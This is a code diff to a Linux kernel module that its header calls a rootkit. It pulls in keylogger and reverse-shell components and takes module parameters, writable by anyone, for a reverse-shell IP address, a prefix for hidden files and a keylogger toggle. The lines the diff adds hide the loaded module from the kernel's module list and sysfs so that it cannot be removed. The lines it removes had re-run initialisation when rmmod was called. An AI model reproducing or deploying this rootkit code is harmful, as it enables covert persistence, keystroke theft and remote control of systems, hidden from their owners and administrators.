@@ -3,12 +3,12 @@
  * @author  Aaron Lichtman, Arch Gupta
  * @brief   A rootkit. TODO: Expand description
  */
-#include <linux/fs.h>
-#include <linux/init.h>
-#include <linux/types.h>
-#include <linux/jiffies.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
+#include <linux/init.h>
+#include <linux/fs.h>
+#include <linux/types.h>
+#include <linux/jiffies.h>
 #include <linux/timer.h>
 #include <linux/threads.h>
 #include <linux/syscalls.h>
@@ -16,6 +16,8 @@
 #include <linux/pid.h>
 #include <linux/cred.h>
 #include <linux/unistd.h>
+#include <asm/unistd.h>
+#include <linux/signal.h>
 #include "arsenal/keylogger.c"
 #include "arsenal/reverse-shell.c"
 #include "khook/engine.c"
@@ -40,13 +42,6 @@ typedef struct legacy_timer_emu {
 typedef struct timer_list _timer;
 #endif
 
-typedef struct commands {
-    // TODO: Add properties for each of the commands we can accept
-    char *rev_shell_ip;
-    // TODO: Add toggle for enabling and disabling hidden files.
-    bool keylogger;
-} commands;
-
 /**
  * Global defines and variables.
  */
@@ -54,7 +49,6 @@ typedef struct commands {
 #define POLLING_INTERVAL 1500
 #define ROOT_PRIV_ESC_MAGIC PID_MAX_DEFAULT // Highest PID on a 64-bit OS. TODO: Make 32/64 compat.
 static _timer polling_timer;
-struct commands cmds;
 
 /**
  * Module parameters are made writable by anyone.
@@ -70,6 +64,7 @@ MODULE_PARM_DESC(block_removal, "Toggle for blocking removal of rootkit.");
 static char *rev_shell_ip = NULL;
 module_param(rev_shell_ip, charp, 0770);
 MODULE_PARM_DESC(rev_shell_ip, "IP Address for reverse shell.");
+// TODO: Convert to array of strings.
 static char *hidden_file_prefix = NULL;
 module_param(hidden_file_prefix, charp, 0770);
 MODULE_PARM_DESC(hidden_file_prefix, "Prefix for hidden files.");
@@ -227,9 +222,8 @@ __inline static void timer_cleanup_wrapper(_timer *timer) {
 }
 
 /**
- * Check all parameters against last-known values and see if anything changed.
- * If yes, take the requested action.
- * Finally, start a timer to call this function again in the future.
+ * Do something on an interval, and then  start a timer to call this
+ * function again in the future.
  * NOTE: The data parameter is required in order for this to compile.
  */
 static void poll_for_commands(unsigned long data) {
@@ -240,20 +234,9 @@ static void poll_for_commands(unsigned long data) {
 	printk(KERN_EMERG "block_removal: %d", block_removal);
 	printk(KERN_EMERG "keylogger enabled: %d", keylogger);
 
-    if (rev_shell_ip != cmds.rev_shell_ip) {
-        printk(KERN_EMERG "rev_shell_ip updated: %s\n", rev_shell_ip);
-        cmds.rev_shell_ip = rev_shell_ip;
-        // TODO: Set up reverse shell.
-    }
-
     // TODO: Check for change in hidden file hiding
     // TODO: Check for keylogger enabling
     set_timer(&polling_timer);
-}
-
-static void copy_params_into_cmd_struct(commands *cmd) {
-    cmd->rev_shell_ip = rev_shell_ip;
-    cmd->keylogger = keylogger;
 }
 
 /**
@@ -263,12 +246,17 @@ static int __init rootkit_init(void) {
     printk(KERN_EMERG "Initializing rootkit...\n");
     khook_init();
 
-    printk(KERN_EMERG "Reading parameters...\n");
-    copy_params_into_cmd_struct(&cmds);
+	// sys_kill(234142, SIGQUIT);
 
     printk(KERN_EMERG "Initializing timer...\n");
     timer_init_wrapper(&polling_timer, poll_for_commands);
     set_timer(&polling_timer);
+
+	if (block_removal) {
+		printk(KERN_EMERG "Blocking removal and hiding rootkit...\n");
+		list_del_init(&__this_module.list);
+		kobject_del(&THIS_MODULE->mkobj.kobj);
+	}
 
     // Gotta make the compiler happy.
     poll_for_commands(0);
@@ -276,20 +264,12 @@ static int __init rootkit_init(void) {
 }
 
 /**
- * Called when $ rmmod is executed. If block_removal is toggled on, this
- * function stops the rootkit from being removed. If it is not enabled,
- * the rootkit is cleaned up nicely.
+ * Called when $ rmmod is executed. Cleans up rootkit nicely.
  */
 static void __exit rootkit_exit(void) {
 	printk(KERN_EMERG "rmmod called. Cleaning up rootkit.");
-	if (block_removal) {
-		printk(KERN_EMERG "Just kidding. This sounds like a good time to reinstall your OS.");
-		rootkit_init();
-	} else {
-		khook_cleanup();
-		timer_cleanup_wrapper(&polling_timer);
-	}
-
+	khook_cleanup();
+	timer_cleanup_wrapper(&polling_timer);
 }
 
 module_init(rootkit_init);
